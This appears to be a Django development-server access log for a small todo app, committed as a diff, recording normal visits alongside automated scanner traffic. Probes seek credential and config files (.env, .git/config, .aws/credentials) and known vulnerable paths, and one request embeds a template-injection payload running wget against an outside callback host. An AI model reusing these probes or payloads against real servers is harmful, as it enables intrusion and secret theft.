+[19/Nov/2022 00:07:24] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 00:07:24] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /http:/api.ipify.org/
+[19/Nov/2022 00:52:49] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 1687
+Not Found: /../../../mnt/mtd/Config/Account1
+[19/Nov/2022 02:19:49] "GET /../../../mnt/mtd/Config/Account1 HTTP/1.1" 404 2513
+[19/Nov/2022 06:14:01] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[19/Nov/2022 06:14:01] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[19/Nov/2022 06:14:01] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:14:01] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 06:14:01] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 06:14:11] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 06:14:11] "GET /todos HTTP/1.1" 301 0
+Not Found: /metrics
+[19/Nov/2022 06:14:11] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[19/Nov/2022 06:14:11] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:14:11] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 06:14:42] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 06:14:42] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 06:14:43] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /metrics
+[19/Nov/2022 06:14:43] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[19/Nov/2022 06:14:43] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:14:59] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[19/Nov/2022 06:14:59] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[19/Nov/2022 06:14:59] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:14:59] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 06:14:59] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 06:15:10] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[19/Nov/2022 06:15:10] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[19/Nov/2022 06:15:10] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:15:10] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 06:15:11] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /.git/config
+[19/Nov/2022 06:15:35] "GET /.git/config HTTP/1.1" 404 2459
+[19/Nov/2022 06:15:35] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[19/Nov/2022 06:15:35] "GET /metrics HTTP/1.1" 404 2447
+[19/Nov/2022 06:15:35] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 06:15:35] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 08:46:47] code 400, message Bad request version ('À\x14À')
+[19/Nov/2022 08:46:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[19/Nov/2022 09:22:54] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 09:22:55] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 09:22:55] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 10:13:16] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 10:13:16] "GET /todos HTTP/1.1" 301 0
+[19/Nov/2022 10:13:17] "GET /todos/ HTTP/1.1" 200 4096
+[19/Nov/2022 16:48:29] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 20:32:10] code 400, message Bad request version ('À\x14À')
+[19/Nov/2022 20:32:10] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Nov/2022 00:20:29,220] - Broken pipe from ('18.130.216.168', 21345)
+
+[20/Nov/2022 00:29:48,772] - Broken pipe from ('18.130.216.168', 21345)
+
+[20/Nov/2022 00:39:09,012] - Broken pipe from ('18.130.216.168', 21345)
+
+[20/Nov/2022 00:48:29,229] - Broken pipe from ('18.130.216.168', 21345)
+
+[20/Nov/2022 00:57:48,912] - Broken pipe from ('18.130.216.168', 21345)
+
+[20/Nov/2022 02:10:41] code 400, message Bad request version ('À\x14À')
+[20/Nov/2022 02:10:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Nov/2022 02:10:43] code 400, message Bad request version ('À\x14À')
+[20/Nov/2022 02:10:43] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Nov/2022 02:10:45] code 400, message Bad request version ('À\x14À')
+[20/Nov/2022 02:10:45] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Nov/2022 02:10:47] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03')
+[20/Nov/2022 02:10:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[20/Nov/2022 02:10:49] code 400, message Bad request version ('À\x14À')
+[20/Nov/2022 02:10:49] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /favicon.ico
+[20/Nov/2022 02:10:51] "GET /favicon.ico HTTP/1.1" 404 2459
+Not Found: /manage/account/login
+[20/Nov/2022 02:10:53] "GET /manage/account/login HTTP/1.1" 404 2486
+[20/Nov/2022 02:10:55] "GET /admin/index.html HTTP/1.1" 302 0
+Not Found: /index.html
+[20/Nov/2022 02:10:57] "GET /index.html HTTP/1.1" 404 2456
+[20/Nov/2022 02:10:59] "GET / HTTP/1.1" 302 0
+[20/Nov/2022 08:40:31,889] - Broken pipe from ('104.152.52.142', 51990)
+
+[20/Nov/2022 09:23:08] "GET / HTTP/1.1" 302 0
+[20/Nov/2022 09:23:08] "GET /todos HTTP/1.1" 301 0
+[20/Nov/2022 09:23:09] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /favicon.ico
+[20/Nov/2022 09:23:10] "GET /favicon.ico HTTP/1.1" 404 2459
+[20/Nov/2022 21:46:39] "GET / HTTP/1.1" 302 0
+[20/Nov/2022 21:46:45] "GET / HTTP/1.1" 302 0
+[20/Nov/2022 21:46:45] "GET /todos HTTP/1.1" 301 0
+[21/Nov/2022 02:57:38] code 400, message Bad request version ("\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+[21/Nov/2022 02:57:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.env
+[21/Nov/2022 02:57:38] "GET /.env HTTP/1.1" 404 2438
+Not Found: /.env
+[21/Nov/2022 02:57:39] "POST /.env HTTP/1.1" 404 2439
+Not Found: /_profiler/phpinfo
+[21/Nov/2022 05:13:15] "GET /_profiler/phpinfo HTTP/1.1" 404 2477
+[21/Nov/2022 05:13:15] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x97u\x86\x87ì\x00\x7f=Æe`©=\x12\x87\x1f')
+[21/Nov/2022 05:13:15] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Forbidden (CSRF cookie not set.): /
+[21/Nov/2022 05:13:15] "POST / HTTP/1.1" 403 2870
+[21/Nov/2022 08:18:55] code 400, message Bad request version ('À\x14À')
+[21/Nov/2022 08:18:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[21/Nov/2022 14:44:07] "GET / HTTP/1.0" 302 0
+[21/Nov/2022 18:54:37] "GET / HTTP/1.1" 302 0
+[21/Nov/2022 19:59:13] "GET / HTTP/1.1" 302 0
+[21/Nov/2022 19:59:14] "GET /todos HTTP/1.1" 301 0
+[21/Nov/2022 19:59:15] "GET /todos/ HTTP/1.1" 200 4096
+[22/Nov/2022 03:46:43] code 400, message Bad request version ("\x92èWW\x11Ôõ/8'F!îÃÀ-b1\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+[22/Nov/2022 03:46:43] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[22/Nov/2022 09:56:16] code 400, message Bad request version ('À\x14À')
+[22/Nov/2022 09:56:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[22/Nov/2022 17:33:05] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[22/Nov/2022 17:33:05] "  /*à     Cookie: mstshash=Administr" 400 -
+[22/Nov/2022 17:44:41] "GET / HTTP/1.1" 302 0
+[22/Nov/2022 17:44:50] "GET / HTTP/1.1" 302 0
+[22/Nov/2022 17:44:50] "GET /todos HTTP/1.1" 301 0
+[22/Nov/2022 23:21:33] code 400, message Bad request version (")å¿æü\x1a\x9d\x00ïÜÌÆÇ\x94\x81½ì\x81q_¤Ú\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+[22/Nov/2022 23:21:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[23/Nov/2022 07:18:04] "GET / HTTP/1.1" 302 0
+[23/Nov/2022 07:18:05] "GET /todos HTTP/1.1" 301 0
+[23/Nov/2022 07:18:05] "GET /todos/ HTTP/1.1" 200 4096
+[23/Nov/2022 09:44:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[23/Nov/2022 09:44:30] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /.env
+[23/Nov/2022 10:50:07] "GET /.env HTTP/1.1" 404 2438
+Forbidden (CSRF cookie not set.): /
+[23/Nov/2022 10:50:07] "POST / HTTP/1.1" 403 2870
+[23/Nov/2022 18:28:38] "GET / HTTP/1.1" 302 0
+[23/Nov/2022 18:29:02] "GET / HTTP/1.1" 302 0
+[23/Nov/2022 18:29:03] "GET /todos HTTP/1.1" 301 0
+[23/Nov/2022 21:24:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ùñä\x03Ô]\x05\x16,\x88§³u--y¸\x95\x91ë\x0f{\x83ìOúb5ý$F:\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[23/Nov/2022 21:24:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[24/Nov/2022 00:40:18] code 400, message Bad request syntax ('\x01I20100')
+[24/Nov/2022 00:40:18] "I20100" 400 -
+[24/Nov/2022 01:33:50] code 400, message Bad request syntax ('\x01\x01æ')
+[24/Nov/2022 01:33:50] "æ" 400 -
+[24/Nov/2022 01:52:04] code 400, message Bad request syntax ('JDWP-Handshake')
+[24/Nov/2022 01:52:04] "JDWP-Handshake" 400 -
+[24/Nov/2022 10:24:49] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03a\x94Êãa\x98\x11V9\x93\x95ßA\x13À\\ÌÀsÃ>R\x1aPh§ã\x0eÞ\x80·\x8e\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[24/Nov/2022 10:24:49] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[24/Nov/2022 10:29:14] "HEAD / HTTP/1.0" 302 0
+Not Found: /system_api.php
+[24/Nov/2022 10:29:14] "GET /system_api.php HTTP/1.1" 404 2468
+Not Found: /c/version.js
+[24/Nov/2022 10:29:15] "GET /c/version.js HTTP/1.1" 404 2462
+Not Found: /streaming/clients_live.php
+[24/Nov/2022 10:29:16] "GET /streaming/clients_live.php HTTP/1.1" 404 2504
+Not Found: /stalker_portal/c/version.js
+[24/Nov/2022 10:29:17] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2507
+Not Found: /stream/live.php
+[24/Nov/2022 10:29:17] "GET /stream/live.php HTTP/1.1" 404 2471
+Not Found: /flu/403.html
+[24/Nov/2022 10:29:18] "GET /flu/403.html HTTP/1.1" 404 2462
+[24/Nov/2022 10:29:19] "GET / HTTP/1.1" 302 0
+[24/Nov/2022 10:29:19] "GET /todos HTTP/1.1" 301 0
+[24/Nov/2022 10:29:20] "GET /todos/ HTTP/1.1" 200 4096
+[24/Nov/2022 14:21:42] code 400, message Bad request version ('À\x13À')
+[24/Nov/2022 14:21:42] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[24/Nov/2022 14:21:42] "GET / HTTP/1.1" 302 0
+[24/Nov/2022 14:21:42] code 400, message Bad request syntax ('HELP')
+[24/Nov/2022 14:21:42] "HELP" 400 -
+[24/Nov/2022 14:21:43] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 302 0
+[24/Nov/2022 14:21:43] "GET / HTTP/1.1" 302 0
+Not Found: /api/v2/cmdb/system/admin/admin
+Not Found: /debug/default/view
+Not Found: /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+Not Found: /telescope/requests
+[24/Nov/2022 14:21:43] "GET /telescope/requests HTTP/1.1" 404 2480
+Not Found: /info.php
+Not Found: /.git/config
+[24/Nov/2022 14:21:43] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /.DS_Store
+[24/Nov/2022 14:21:43] "GET /.DS_Store HTTP/1.1" 404 2453
+Not Found: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[24/Nov/2022 14:21:43] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 2651
+[24/Nov/2022 14:21:43] "GET /info.php HTTP/1.1" 404 2450
+[24/Nov/2022 14:21:43] "GET /debug/default/view?panel=config HTTP/1.1" 404 2493
+[24/Nov/2022 14:21:43] "GET /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 2722
+[24/Nov/2022 14:21:43] "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1" 404 2516
+Not Found: /.env
+[24/Nov/2022 14:21:43] "GET /.env HTTP/1.1" 404 2438
+Not Found: /server-status
+[24/Nov/2022 14:21:43] "GET /server-status HTTP/1.1" 404 2465
+Not Found: /api/search
+[24/Nov/2022 14:21:43] "GET /api/search?folderIds=0 HTTP/1.1" 404 2468
+Not Found: /about
+[24/Nov/2022 14:21:43] "GET /about HTTP/1.1" 404 2441
+Not Found: /config.json
+[24/Nov/2022 14:21:43] "GET /config.json HTTP/1.1" 404 2459
+Not Found: /v2/_catalog
+[24/Nov/2022 14:21:43] "GET /v2/_catalog HTTP/1.1" 404 2459
+Not Found: /login.action
+[24/Nov/2022 14:21:43] "GET /login.action HTTP/1.1" 404 2462
+[24/Nov/2022 15:46:00,353] - Broken pipe from ('167.248.133.62', 50246)
+
+[24/Nov/2022 15:46:00] code 400, message Bad request version ('À\x14À')
+[24/Nov/2022 15:46:00] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[24/Nov/2022 15:46:01] "GET / HTTP/1.1" 302 0
+[24/Nov/2022 15:46:01,910] - Broken pipe from ('167.248.133.62', 46276)
+
+[24/Nov/2022 15:46:02] "GET / HTTP/1.1" 302 0
+[24/Nov/2022 15:46:02] code 505, message Invalid HTTP version (2.0)
+[24/Nov/2022 15:46:02] "PRI * HTTP/2.0" 505 -
+[24/Nov/2022 15:46:02] "GET /todos HTTP/1.1" 301 0
+[24/Nov/2022 15:46:03] code 505, message Invalid HTTP version (2.0)
+[24/Nov/2022 15:46:03] "PRI * HTTP/2.0" 505 -
+[24/Nov/2022 15:46:03] "GET /todos/ HTTP/1.1" 200 4096
+[24/Nov/2022 15:46:03] code 505, message Invalid HTTP version (2.0)
+[24/Nov/2022 15:46:03] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[24/Nov/2022 15:46:04] "GET /favicon.ico HTTP/1.1" 404 2459
+[24/Nov/2022 16:41:59] "GET / HTTP/1.1" 302 0
+[24/Nov/2022 16:42:00] "GET /todos HTTP/1.1" 301 0
+[24/Nov/2022 16:42:01] "GET /todos/ HTTP/1.1" 200 4096
+[24/Nov/2022 18:54:23] "GET / HTTP/1.1" 302 0
+Not Found: /page
+[24/Nov/2022 23:12:22] "GET /page?id=2HzidGf7AvrJBYSGpViLrEifEsw&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27wget+http://cdvmifl71kdrt3000010akiwh7ey3mki3.oast.online%27);s HTTP/1.1" 404 2644
+[25/Nov/2022 00:29:35] code 400, message Bad request version ('À\x13À')
+[25/Nov/2022 00:29:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[25/Nov/2022 00:29:37] code 400, message Bad request version ('À\x13À')
+[25/Nov/2022 00:29:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.env
+[25/Nov/2022 01:39:58] "GET /.env HTTP/1.1" 404 2438
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 01:39:58] "POST / HTTP/1.1" 403 2870
+[25/Nov/2022 02:55:35] "GET / HTTP/1.1" 302 0
+Not Found: /favicon.ico
+[25/Nov/2022 03:44:47] "GET /favicon.ico HTTP/1.1" 404 2459
+[25/Nov/2022 03:52:21] "GET /todos HTTP/1.1" 301 0
+[25/Nov/2022 04:35:28] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /.env
+[25/Nov/2022 06:35:31] "GET /.env HTTP/1.1" 404 2438
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:31] "POST / HTTP/1.1" 403 2870
+Not Found: /.aws/credentials
+[25/Nov/2022 06:35:31] "GET /.aws/credentials HTTP/1.1" 404 2474
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:32] "POST / HTTP/1.1" 403 2870
+Not Found: /phpinfo
+[25/Nov/2022 06:35:32] "GET /phpinfo HTTP/1.1" 404 2447
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:32] "POST / HTTP/1.1" 403 2870
+Not Found: /phpinfo.php
+[25/Nov/2022 06:35:32] "GET /phpinfo.php HTTP/1.1" 404 2459
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:33] "POST / HTTP/1.1" 403 2870
+Not Found: /aws.yml
+[25/Nov/2022 06:35:33] "GET /aws.yml HTTP/1.1" 404 2447
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:33] "POST / HTTP/1.1" 403 2870
+Not Found: /.env.bak
+[25/Nov/2022 06:35:33] "GET /.env.bak HTTP/1.1" 404 2450
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:33] "POST / HTTP/1.1" 403 2870
+Not Found: /info.php
+[25/Nov/2022 06:35:34] "GET /info.php HTTP/1.1" 404 2450
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:34] "POST / HTTP/1.1" 403 2870
+Not Found: /config/aws.yml
+[25/Nov/2022 06:35:34] "GET /config/aws.yml HTTP/1.1" 404 2468
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:34] "POST / HTTP/1.1" 403 2870
+Not Found: /_profiler/phpinfo
+[25/Nov/2022 06:35:35] "GET /_profiler/phpinfo HTTP/1.1" 404 2477
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:35] "POST / HTTP/1.1" 403 2870
+Not Found: /config/parameters.yml
+[25/Nov/2022 06:35:35] "GET /config/parameters.yml HTTP/1.1" 404 2489
+Forbidden (CSRF cookie not set.): /
+[25/Nov/2022 06:35:35] "POST / HTTP/1.1" 403 2870
+[25/Nov/2022 12:15:22] "GET / HTTP/1.1" 302 0
+[25/Nov/2022 12:15:49] "GET / HTTP/1.1" 302 0
+[25/Nov/2022 12:15:49] "GET /todos HTTP/1.1" 301 0
+Not Found: /http:/api.ipify.org/
+[25/Nov/2022 12:16:14] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 1687
+[25/Nov/2022 12:16:45] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Nov/2022 12:16:45] " " 400 -
+[25/Nov/2022 14:16:24] code 400, message Bad request version ('À\x14À')
+[25/Nov/2022 14:16:24] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[25/Nov/2022 14:16:37] "GET / HTTP/1.1" 302 0
+[25/Nov/2022 14:16:57] "GET /todos HTTP/1.1" 301 0
+[25/Nov/2022 14:16:59] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /favicon.ico
+[25/Nov/2022 14:17:05] "GET /favicon.ico HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[25/Nov/2022 14:17:09] "GET /robots.txt HTTP/1.1" 404 2456
+Not Found: /sitemap.xml
+[25/Nov/2022 14:17:11] "GET /sitemap.xml HTTP/1.1" 404 2459
+[25/Nov/2022 14:17:26,017] - Broken pipe from ('23.224.189.27', 59430)
+
+[25/Nov/2022 14:17:29,859] - Broken pipe from ('23.224.189.27', 33668)
+
+[25/Nov/2022 14:20:21,342] - Broken pipe from ('23.224.189.27', 56122)
+
+[25/Nov/2022 17:49:53] "GET / HTTP/1.1" 302 0
+[25/Nov/2022 17:49:54] "GET /todos HTTP/1.1" 301 0
+[25/Nov/2022 17:49:54] "GET /todos/ HTTP/1.1" 200 4096
+[25/Nov/2022 17:49:54] "GET /static/css/style.css HTTP/1.1" 200 225
+Not Found: /favicon.ico
+[25/Nov/2022 17:49:59] "GET /favicon.ico HTTP/1.1" 404 2459
+[25/Nov/2022 22:16:31] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03µþÍÌÚÈ\x9b¡\x11U\x19VBR¼n\x9c\x9aðdÛ\x13?ýÞB$]ÅöÏ5\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[25/Nov/2022 22:16:31] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[25/Nov/2022 22:36:46] "GET / HTTP/1.1" 302 0
+[26/Nov/2022 02:07:20] "GET / HTTP/1.1" 302 0
+[26/Nov/2022 02:07:35] "GET /todos HTTP/1.1" 301 0
+[26/Nov/2022 02:07:35] code 505, message Invalid HTTP version (2.0)
+[26/Nov/2022 02:07:35] "PRI * HTTP/2.0" 505 -
+[26/Nov/2022 02:07:36] "GET /todos/ HTTP/1.1" 200 4096
+[26/Nov/2022 02:07:36] code 505, message Invalid HTTP version (2.0)
+[26/Nov/2022 02:07:36] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[26/Nov/2022 02:07:36] "GET /favicon.ico HTTP/1.1" 404 2459
+[26/Nov/2022 14:06:21] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ôf\x90ú\x04Ç8\x9b"\x98!å\x86I¬Éÿlray^\x0e¦×\x8dï\x879\x10IU\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[26/Nov/2022 14:06:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[26/Nov/2022 22:21:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03nBñò\x8cêzß{ëI\x04\x98\x93sØwÜA\x13×\x99©&Õ\x88ûë\x01Õ\x9f|')
+[26/Nov/2022 22:21:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[27/Nov/2022 01:43:00] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 10:10:34] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 10:10:35] "GET /todos HTTP/1.1" 301 0
+[27/Nov/2022 10:10:35] "GET /todos/ HTTP/1.1" 200 4096
+[27/Nov/2022 13:02:44] code 400, message Bad request version ('À\x14À')
+[27/Nov/2022 13:02:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[27/Nov/2022 14:27:28] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 14:27:42] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 14:27:43] "GET /todos HTTP/1.1" 301 0
+[27/Nov/2022 14:28:03] code 400, message Bad request syntax ('\x05\x01\x00')
+[27/Nov/2022 14:28:03] code 400, message Bad request syntax ('\x05\x01\x00')
+[27/Nov/2022 14:28:03] " " 400 -
+[27/Nov/2022 14:28:03] " " 400 -
+[27/Nov/2022 18:09:06] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 18:09:07] code 505, message Invalid HTTP version (2.0)
+[27/Nov/2022 18:09:07] "PRI * HTTP/2.0" 505 -
+[27/Nov/2022 18:09:07] "GET /todos HTTP/1.1" 301 0
+[27/Nov/2022 18:09:08] code 505, message Invalid HTTP version (2.0)
+[27/Nov/2022 18:09:08] "PRI * HTTP/2.0" 505 -
+[27/Nov/2022 18:09:08] "GET /todos/ HTTP/1.1" 200 4096
+[27/Nov/2022 18:09:09] code 505, message Invalid HTTP version (2.0)
+[27/Nov/2022 18:09:09] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[27/Nov/2022 18:09:09] "GET /favicon.ico HTTP/1.1" 404 2459
+[27/Nov/2022 18:54:42] "GET / HTTP/1.1" 302 0
+[27/Nov/2022 20:41:10] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[27/Nov/2022 20:41:10] "  /*à     Cookie: mstshash=Administr" 400 -
+[27/Nov/2022 23:19:11] "GET / HTTP/1.0" 302 0
+[28/Nov/2022 00:14:51] code 400, message Bad request version ('À\x13À')
+[28/Nov/2022 00:14:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[28/Nov/2022 00:14:51] "GET / HTTP/1.1" 302 0
+[28/Nov/2022 00:14:51] code 400, message Bad request syntax ('HELP')
+[28/Nov/2022 00:14:51] "HELP" 400 -
+Not Found: /debug/default/view
+Not Found: /api/v2/cmdb/system/admin/admin
+[28/Nov/2022 00:14:52] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 302 0
+[28/Nov/2022 00:14:52] "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1" 404 2516
+[28/Nov/2022 00:14:52] "GET /debug/default/view?panel=config HTTP/1.1" 404 2493
+Not Found: /telescope/requests
+[28/Nov/2022 00:14:52] "GET /telescope/requests HTTP/1.1" 404 2480
+Not Found: /server-status
+[28/Nov/2022 00:14:52] "GET /server-status HTTP/1.1" 404 2465
+Not Found: /.DS_Store
+[28/Nov/2022 00:14:52] "GET /.DS_Store HTTP/1.1" 404 2453
+Not Found: /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+Not Found: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[28/Nov/2022 00:14:52] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 2651
+[28/Nov/2022 00:14:52] "GET /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 2722
+Not Found: /.env
+[28/Nov/2022 00:14:52] "GET /.env HTTP/1.1" 404 2438
+Not Found: /info.php
+[28/Nov/2022 00:14:52] "GET /info.php HTTP/1.1" 404 2450
+[28/Nov/2022 00:14:52] "GET / HTTP/1.1" 302 0
+Not Found: /.git/config
+[28/Nov/2022 00:14:52] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /v2/_catalog
+[28/Nov/2022 00:14:52] "GET /v2/_catalog HTTP/1.1" 404 2459
+Not Found: /config.json
+[28/Nov/2022 00:14:52] "GET /config.json HTTP/1.1" 404 2459
+Not Found: /api/search
+[28/Nov/2022 00:14:52] "GET /api/search?folderIds=0 HTTP/1.1" 404 2468
+Not Found: /about
+[28/Nov/2022 00:14:52] "GET /about HTTP/1.1" 404 2441
+Not Found: /login.action
+[28/Nov/2022 00:14:52] "GET /login.action HTTP/1.1" 404 2462
+Not Found: /http:/154.221.20.190/sm/ip.txt
+[28/Nov/2022 01:12:53] "GET http://154.221.20.190/sm/ip.txt HTTP/1.1" 404 1706
+[28/Nov/2022 05:54:19] "GET / HTTP/1.0" 302 0
+[28/Nov/2022 05:54:19] "GET / HTTP/1.1" 302 0
+Not Found: /robots.txt
+[28/Nov/2022 05:54:19] "GET /robots.txt HTTP/1.1" 404 2456
+Not Found: /sitemap.xml
+[28/Nov/2022 05:54:19] "GET /sitemap.xml HTTP/1.1" 404 2459
+[28/Nov/2022 05:54:20] "GET /todos HTTP/1.1" 301 0
+Not Found: /sitemap.xml
+[28/Nov/2022 05:54:21] "GET /sitemap.xml HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[28/Nov/2022 05:54:21] "GET /robots.txt HTTP/1.1" 404 2456
+[28/Nov/2022 05:54:21] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /sitemap.xml
+[28/Nov/2022 05:54:21] "GET /sitemap.xml HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[28/Nov/2022 05:54:21] "GET /robots.txt HTTP/1.1" 404 2456
+[28/Nov/2022 13:40:15] "GET / HTTP/1.1" 302 0
+[28/Nov/2022 13:40:29] "GET / HTTP/1.1" 302 0
+[28/Nov/2022 13:40:30] "GET /todos HTTP/1.1" 301 0
+Not Found: /http:/api.ipify.org/
+[28/Nov/2022 13:40:39] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 1687
+[28/Nov/2022 20:28:04] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$\x96W;fÞY_/Ï´GÝQ~\\s·cHuÚb/\x87cèçT')
+[28/Nov/2022 20:28:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[28/Nov/2022 22:40:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[28/Nov/2022 22:40:13] "  /*à     Cookie: mstshash=Administr" 400 -
